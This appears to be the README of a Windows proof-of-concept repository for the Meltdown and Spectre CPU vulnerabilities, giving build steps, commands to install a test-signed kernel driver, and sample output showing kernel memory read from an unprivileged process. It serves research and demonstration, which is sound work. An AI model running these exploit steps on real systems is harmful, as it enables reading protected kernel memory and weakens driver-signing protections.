# Meltdown/Spectre Proof-of-Concept for Windows

This repository contains PoC codes to demonstrate the famous Meltdown/Spectre vulnerability.

## Software requirements to build

Don't worry, all free :wink:.

- Visual Studio Community 2017<br />[https://www.visualstudio.com/downloads/](https://www.visualstudio.com/downloads/)
- Windows 10 SDK<br />[https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk](https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk)
- WDK for Windows 10<br />[https://developer.microsoft.com/en-us/windows/hardware/download-kits-windows-hardware-development](https://developer.microsoft.com/en-us/windows/hardware/download-kits-windows-hardware-development)
- The Netwide Assembler<br />[http://www.nasm.us/](http://www.nasm.us/)

## How to build

### 1. Configure NASM

Update `ASM` in `common.inc` with the path to nasm.exe

### 2. Prepare a codesign certificate to sign a driver (for Meltdown Full)

Meltdown Full PoC needs help from a driver, that is included in this repo.  In the current Windows, drivers need to be signed with a codesign certificate.  So you need to create a self-signed or CA-signed certificate.  If you are a millionaire, you may have a [Windows EV signing cert](https://docs.microsoft.com/en-us/windows-hardware/drivers/dashboard/get-a-code-signing-certificate).

`Makefile` in the repo already has a step to sign a driver file.  What you need to do is:

1. Prepare a certificate having 'codeSigning' (1.3.6.1.5.5.7.3.3) in the extended key usage section<br />OpenSSL is always your friend.  If you prefer Microsoft'ish way, [this](https://msdn.microsoft.com/en-us/library/windows/desktop/jj835832.aspx) would be useful.

2. On your build machine, install your certificate to the 'My' Certificate store:<br />`certutil -add My <path_to_pfx>`

3. Update `CODESIGN_SHA1` in `03_meltdown_full/Makefile` with SHA1 hash of your certificate.

4. On you test machine to run the driver on, enable testsigning:<br />`bcdedit /set testsigning on`

5. Reboot the test machine to enable the testsigning mode

### 3. Build

Launch "x64 Native Tools Command Prompt for VS 2017" and run `NMAKE` on the root of this repo.  Binaries will be generated under the subdirectory "bin/amd64".

The current code supports x64 only.  32bit compilation will fail.

## How to run

### PoC #1: Toy example of Meltdown

This PoC demonstrates the toy example of Meltdown described in the [Meltdown paper](https://arxiv.org/abs/1801.01207).  The program executes an instruction that throws Divide-by-zero exception.  However, CPU speculatively runs instructions that are placed after the division and that behavior changes CPU's micro-architectural state.  Using Flush+Reload technique, the program can identify a value that is loaded from memory during out-of-order execution.

#### Run & Output

Run `toy.exe`.  The output means how many cycles are consumed to read each of 256 probe lines.  In the below example, obviously loading the index 0x42 is much faster than the others.  This is the micro-architectural change caused by out-of-order execution.

```
> bin\amd64\toy.exe
trial#118: guess=42 (score=72)
   258   261   264   264   225   228   231   228   225   228   231   225   264   294   255   267
   258   261   261   261   264   264   228   228   240   258   264   264   267   267   264   261
   261   261   264   258   261   258   264   264   225   222   222   231   231   231   258   261
   264   261   255   261   264   264   261   264   258   258   264   261   255   258   255   255
   258   264    72   261   258   264   261   261   258   264   258   264   264   261   261   258
   264   222   225   228   228   228   228   225   231   267   258   264   255   255   261   255
   261   261   258   258   261   255   261   255   264   258   258   258   261   261   261   258
..(snip)..
```

### PoC #2: Toy example of Spectre

This PoC demonstrates two variants presented in the [Spectre paper](https://arxiv.org/abs/1801.01203): '4. Exploiting Conditional Branch Misprediction' and '5. Poisoning Indirect Branches'.

The first variant 'Exploiting Conditional Branch Misprediction' proves that CPU predicts a condition based on the previous results, and runs a branch speculatively when the result of that condition is still uncertain.  The paper also includes the example implementation of this variant in C as Appendix A.  I could simplify that example a lot by using assembly language.

The second variant 'Poisoning Indirect Branches' proves that CPU predicts the destination address of an indirect jump instruction based on the previous results.  This PoC uses `call [rax]` to demonstrate the indirect jump.  You can observe the processor speculatively runs the code at the previous jump destination while fetching a real destination from the address stored in the register `rax`.

In both variants, an attacker can *train* the branch predictor to cause the processor to mispredict a branch to the address which the attacker wants to run.

#### Run & Output

Run `branch.exe --variant1` for Conditional Branch Misprediction or `branch.exe --variant2` for Poisoning Indirect Branches.  The output is the same as Meltdown's toy example.

```
> bin\amd64\branch.exe --variant1
trial#0: guess='A' (score=78)
    27   267   264   261   291   330   264   297   258   261   255   255   300   222   225   294
   264   264   258   297   291   264   303   264   261   261   297   228   225   303   261   303
   225   330   267   258   300   297   303   297   270   264   330   228   303   258   258   264
   264   258   297   261   258   261   330   258   330   261   225   300   261   303   261   261
   264    78   318   225   228   300   261   261   258   300   228   249   297   300   261   303
   258   264   300   300   228   267   264   297   261   300   231   300   303   258   333   294
   258   264   294   225   297   300   297   300   261   261   261   261   273   261   300   324
..(snip)..
```

### PoC #3: Full Meltdown

This PoC demonstrates a full Meltdown scenario on Windows i.e. reading kernel memory from an unprivileged user-mode process.

[IAIK's Meltdown PoC](https://github.com/IAIK/meltdown) tries to read data at the direct physical map region, but Windows kernel does not have such a region in kernel that is always mapped into the physical memory.  Someone wrote a [PoC for Windows](https://github.com/stormctf/Meltdown-PoC-Windows) that is trying to read data at &lt;Imagebase of NT kernel&gt;+0x1000, but this code did not reproduce Meltdown on any of my environments.

For the demo purpose, I wrote a kernel driver to allocate some bytes in the non-paged pool.  Moreover, to make Meltdown work, I needed to implement a couple of more tricks, that I'll write up somewhere later.

#### Run & Output

First, configure `meltdown.sys` as a kernel service and start it.  This stores some data in the non-paged pool.

```
> sc create meltdown binpath= D:\WORK\meltdown.sys type= kernel
> net start meltdown
```

You can get a kernel address allocated in the previous step by running `mdc.exe`.  You'll see an output as follows.  In the below output, the target is `FFFFD10902564000`.

```
> mdc.exe --info
FullPathName: \SystemRoot\system32\ntoskrnl.exe
ImageBase:    FFFFF8014B889000
ImageSize:    008d2000
FFFFF8014BDA6000 (= nt + 0051d000 ):
 00 00 e8 79 2d ba ff 8b 87 d0 06 00 00 45 33 f6

Secret data should be placed at FFFFD10902564000
```

Before staring Meltdown, run the following command as well.  This makes sure the target data is stored onto L1 cache.  This is a mandatory step.

```
> mdc.exe --timer_start
```

Finally, start `meltdown.exe` to start Meltdown.  The first parameter is the number of bytes to read.  The second parameter is the virtual address to start reading at.  You'll see an output as follows.

```
> meltdown.exe 4 FFFFD10902564000
Target range: FFFFD10902564000 - FFFFD10902564004

You have 8 CPU cores.  Starting probing threads...

running tid:0ae8 for core#0
running tid:1e08 for core#1
running tid:0ad8 for core#2
running tid:16a8 for core#3
running tid:11cc for core#4
running tid:0af0 for core#5
running tid:0af4 for core#6
running tid:0848 for core#7

core#0:  41 6e 10 77
core#1:  00 00 73 00
core#2:  00 e0 00 00
core#3:  00 00 00 00
core#4:  00 00 00 44
core#5:  00 00 00 00
core#6:  00 00 00 00
core#7:  00 00 00 00
```

This PoC is not as stable as the toy examples described earlier.  The actual kernel bytes start with '41 63 73 77'.  You can see the thread running on core#0 got three of them, and core#1 got one.  It's not 100% accurate, but obviously we're seeing data that we should not be able to see.  Success rate depends on CPU, and some parameters hardcoded in the attacker's code.  For example, you may need to increase the value of `max_trial` in `meltdown_full`.

## \*Warning\*

This code is only for testing purposes. Do not run it on any productive systems. Do not run it on any system that might be used by another person or entity.
